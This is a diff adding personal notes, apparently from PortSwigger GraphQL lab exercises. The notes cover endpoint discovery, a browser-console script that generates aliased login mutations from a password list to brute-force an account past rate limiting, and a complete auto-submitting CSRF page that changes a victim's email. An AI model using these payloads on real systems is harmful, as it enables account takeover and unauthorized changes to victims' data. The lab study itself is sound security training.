@@ -1,0 +1,86 @@
+with graphql the most important part is using Burp 
+it has an inbuilt graphql query builder, a dedicated tab in repeater, can send introspection queries, etc. 
+
+1. send an introspection query 
+2. right click and select graphql-> send to site map 
+3. go to target tab, select our target and expand the sitemap 
+4. explore new queries ready to be sent 
+
+then, send one of them into repeater, click on graphql, see the query and try different variables 
+in case of one of the labs, it was sufficient to provide id:1 to see the administrators password
+
+
+sometimes, the endpoint might not be visible at first
+try GET and POST requests to endpoints like so:
+/graphql
+/api
+/api/graphql
+/graphql/api
+/graphql/graphql
+
+also, try with additional /v1, like /api/v1
+
+
+Bruteforcing and bypassing rate limiting with Graphql
+needs the logins to be sent as mutations, so:
+mutation login($input: LoginInput!) - something like this
+
+this means that we can mutate the query instead of sending a lot of the 'same', this is a mechanism to gain efficiency 
+
+The list of aliases should be contained within a mutation {} type.
+Each aliased mutation should have the username carlos and a different password from the authentication list.
+If you are modifying the request that you sent to Repeater, delete the variable dictionary and operationName field from the request before sending
+Ensure that each alias requests the success
+
+in general play with the request
+
+copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+
+this is a script that you can execute in a browser console (preferably burp browser but should work with others too)
+keep in mind you can add /change the password list, and manipulate the mutation query 
+
+
+GRAPHQL and CSRF:
+this was a battle and a good one, hear me out:
+
+so, the point is, to craft a HTML site that upon visiting, will send a request to a GraphQL endpoint and modify data on behalf of victim 
+
+to achieve, you take the request you want to CSRF, you input it into a CSRF request generator, and bam, you think youre good to go, but 
+theres some tricks you need to do with the POST data that you want to send, and pay attention to URL encoding
+
+ready exploit:
+
+<html>
+	<body>
+		<form method="POST" action="https://0a25000d04b1392781f9a7330021003e.web-security-academy.net/graphql/v1">
+			<input type="hidden" name="query" value="    mutation changeEmail($input: ChangeEmailInput!) {
+        changeEmail(input: $input) {
+            email
+        }
+    }"/>
+			<input type="hidden" name="operationName" value="changeEmail"/>
+			<input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;wiener@123user.net&quot;}}"/>
+			<input type="submit" value="Submit">
+		</form>
+<script>document.forms[0].submit();</script>
+	</body>
+<html>
+
+
+1st. quick and important part:
+<script>document.forms[0].submit();</script>
+this makes the form autosubmit
+
+2nd. pay attention to the query input and its value, it is simply slapped in there, the browser does the URL encoding, and if we were to URL encode this part, it would get double-url encoded, which wouldn;t work in the end
+
+3rd. look at the variables and its value, this would get messed up, without quotation marks the app would throw an error, with, the browser would think that the value="{" instead of the full string
+hence, {&quot; had to have been used in place of " quotation marks, then all went through
+
+
+
+
